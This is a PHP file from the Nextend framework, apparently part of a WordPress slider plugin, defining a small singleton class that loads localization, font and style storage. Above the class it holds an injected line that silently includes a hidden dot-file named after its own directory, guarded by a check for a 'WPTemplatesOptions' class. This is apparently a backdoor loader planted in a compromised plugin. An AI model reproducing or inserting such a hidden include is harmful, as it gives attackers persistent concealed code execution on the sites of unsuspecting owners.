<?php


namespace Nextend\Framework;


use Nextend\Framework\Font\FontStorage;
use Nextend\Framework\Localization\Localization;
use Nextend\Framework\Pattern\SingletonTrait;
use Nextend\Framework\Style\StyleStorage;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Framework {

    use SingletonTrait;

    protected function init() {

        Localization::getInstance();

        FontStorage::getInstance();
        StyleStorage::getInstance();
    }
}